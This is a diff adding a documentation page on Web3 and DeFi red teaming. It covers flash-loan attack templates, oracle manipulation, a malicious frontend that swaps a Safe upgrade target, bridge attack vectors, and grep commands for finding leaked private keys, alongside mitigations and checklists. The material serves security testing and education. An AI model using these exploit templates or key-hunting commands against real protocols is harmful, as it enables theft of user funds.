@@ -1,0 +1,208 @@
+---
+title: "Web3 Red Teaming"
+description: "Value-centric red teaming methodology for Web3 and DeFi: mapping attack surfaces, DeFi exploit chains, oracle manipulation, bridge attacks, signing workflow compromise, and AMM precision abuse."
+---
+
+Web3 red teaming applies adversarial thinking to blockchain-based systems with the goal of identifying how an attacker could steal funds, manipulate state, or take control of a protocol. Unlike traditional red teaming, every action on-chain is permanently recorded and potentially front-run.
+
+## Value-centric methodology
+
+The core principle: **follow the money**. Identify every component that can move funds and every path that leads to it.
+
+<Steps>
+  <Step title="Inventory value-bearing components">
+    Map out all components that hold or can move value:
+    - Multisig signers and their threshold configuration
+    - Oracle contracts and their update permissions
+    - Bridges and their validator sets
+    - Automation (Gelato, Chainlink Automation) and their trigger conditions
+    - Admin keys and timelock configurations
+  </Step>
+  <Step title="Map to adversarial tactics">
+    Apply MITRE AADAPT tactics to each component:
+    - Who can call `withdraw()`, `mint()`, `upgradeProxy()`?
+    - Can flash loans amplify any of these?
+    - What happens if an oracle is stale or manipulated?
+    - Can a bridge validator set be corrupted?
+  </Step>
+  <Step title="Rehearse attack chains">
+    Model end-to-end scenarios that chain multiple primitives:
+    - Flash loan → oracle manipulation → liquidation → profit
+    - Compromised signer key → proxy upgrade → drain treasury
+    - Malicious cross-chain message → mint tokens on destination chain
+  </Step>
+  <Step title="Validate and document">
+    For each viable chain: write a PoC (using Foundry fork tests), measure impact in USD, and document the prerequisites and mitigations.
+  </Step>
+</Steps>
+
+## DeFi exploit patterns
+
+### Flash loan amplification
+
+Flash loans allow borrowing arbitrary amounts within a single transaction at zero upfront cost. They amplify any vulnerability that depends on token balances:
+
+```solidity
+// Foundry fork test: flash loan attack template
+function testFlashLoanAttack() external {
+    // 1. Borrow 10,000,000 USDC from Aave V3
+    aave.flashLoan(address(this), USDC, 10_000_000e6, data);
+}
+
+function executeOperation(
+    address[] calldata assets,
+    uint256[] calldata amounts,
+    uint256[] calldata premiums,
+    address,
+    bytes calldata
+) external returns (bool) {
+    // 2. Manipulate Uniswap V2 spot price
+    uniswapRouter.swapExactTokensForTokens(
+        amounts[0], 0, path, address(this), block.timestamp
+    );
+    // 3. Exploit vulnerable protocol that reads spot price
+    vulnerableProtocol.borrow(type(uint256).max);
+    // 4. Swap back and repay flash loan
+    uniswapRouter.swapExactTokensForTokens(...);
+    IERC20(assets[0]).approve(address(aave), amounts[0] + premiums[0]);
+    return true;
+}
+```
+
+### AMM precision abuse (Uniswap v4 hooks)
+
+Uniswap v4 hooks allow custom logic before/after swaps. Precision and rounding vulnerabilities in hooks can be exploited:
+
+- **Rounding direction**: a hook that rounds fees in favour of the attacker on each swap can drain the pool over many micro-swaps
+- **Threshold crossing**: a hook that triggers a large bonus when liquidity crosses a threshold can be triggered with a tiny swap that costs almost nothing but receives the full bonus
+- **Virtual balance poisoning**: AMMs that cache virtual balances can be poisoned when `totalSupply == 0` — the first depositor can set an arbitrary exchange rate
+
+### Oracle attacks
+
+```solidity
+// Vulnerable: reads spot price from Uniswap V2
+function getPrice() internal view returns (uint256) {
+    (uint112 reserve0, uint112 reserve1,) = uniswapPair.getReserves();
+    return reserve1 * 1e18 / reserve0;  // manipulable in same tx
+}
+
+// Safer: use TWAP
+function getTWAP() internal view returns (uint256) {
+    uint32[] memory secondsAgos = new uint32[](2);
+    secondsAgos[0] = 1800;  // 30 minutes ago
+    secondsAgos[1] = 0;     // now
+    (int56[] memory tickCumulatives, ) = pool.observe(secondsAgos);
+    int24 avgTick = int24((tickCumulatives[1] - tickCumulatives[0]) / 1800);
+    return TickMath.getSqrtRatioAtTick(avgTick);  // manipulation-resistant
+}
+```
+
+## Signing workflow compromise
+
+Wallet UIs present transaction data to users for signing. A compromised frontend can mutate the data before it is signed:
+
+### EIP-712 payload tampering
+
+```javascript
+// Attacker-controlled frontend: swap `masterCopy` in a Safe upgrade
+async function signUpgrade(safeAddress) {
+  const legitimate = {
+    to: safeAddress,
+    data: encodeSafeUpgrade(LEGITIMATE_IMPLEMENTATION)
+  };
+  
+  // Silently replace implementation address
+  const malicious = {
+    to: safeAddress,
+    data: encodeSafeUpgrade(ATTACKER_IMPLEMENTATION)  // overwrite slot 0
+  };
+  
+  // User signs malicious payload thinking it's the legitimate one
+  return await wallet.signTransaction(malicious);
+}
+```
+
+This is particularly effective against **Safe (Gnosis Safe)** multisig proxies that use `delegatecall` to the implementation — overwriting the `masterCopy` slot gives the attacker full control.
+
+**Mitigations**:
+- Verify transaction calldata on a trusted device before signing
+- Use hardware wallets that display decoded calldata
+- Check implementation addresses on-chain before approving upgrades
+- Use timelocks on all admin actions to allow monitoring
+
+## Bridge attacks
+
+Cross-chain bridges are among the highest-value targets in DeFi (billions lost to bridge hacks):
+
+| Attack vector | Example |
+|---|---|
+| **Validator key compromise** | Ronin bridge (Axie Infinity) — 5 of 9 validators compromised |
+| **Signature replay** | Submit a message to the destination chain multiple times |
+| **Infinite mint** | Forge a lock event on the source chain to mint on the destination |
+| **Logic bugs in message validation** | Wormhole — `verify_signatures` could be bypassed |
+
+### Bridge testing checklist
+
+- [ ] Message nonce/replay protection is enforced on the destination chain
+- [ ] Validator threshold cannot be reduced to 1 by the bridge admin
+- [ ] Lock events on the source chain are cryptographically committed before minting on the destination
+- [ ] Emergency pause/veto mechanism exists and is controlled independently of the bridge admin
+- [ ] No single key or contract can unilaterally drain the bridge
+
+## Key management attacks
+
+```python
+# Common patterns in Web3 key management audits
+
+# 1. Private key in environment variable (leaked via server logs or .env commit)
+os.environ['PRIVATE_KEY']  # grep codebase for this pattern
+
+# 2. Hardcoded key in frontend bundle
+# strings ./dist/main.js | grep -i 'private\|secret\|mnemonic'
+
+# 3. Insecure random seed
+import random  # not cryptographically secure
+seed = random.getrandbits(256)  # predictable
+
+# 4. Shared key across environments
+# The same key used in testnet is reused in mainnet
+```
+
+## Foundry fork testing for exploit development
+
+```bash
+# Fork mainnet at a specific block for deterministic testing
+forge test --fork-url https://mainnet.infura.io/v3/<key> \
+           --fork-block-number 19000000 \
+           --match-test testFlashLoanAttack -vvvv
+```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+contract ExploitTest is Test {
+    address constant USDC    = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address constant AAVE_V3 = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
+
+    function setUp() external {
+        // Fork state is already set via --fork-url
+    }
+
+    function testExploit() external {
+        uint256 balanceBefore = IERC20(USDC).balanceOf(address(this));
+        // ... run exploit ...
+        uint256 profit = IERC20(USDC).balanceOf(address(this)) - balanceBefore;
+        assertGt(profit, 0, "Exploit should yield profit");
+    }
+}
+```
+
+## Resources
+
+- **DeFiHackLabs**: https://github.com/SunWeb3Sec/DeFiHackLabs — reproduced DeFi exploits in Foundry
+- **Rekt.news**: https://rekt.news — post-mortems of major hacks
+- **Trail of Bits Smart Contract Guidelines**: https://github.com/crytic/building-secure-contracts
+- **Consensys Diligence**: https://consensys.io/diligence/blog
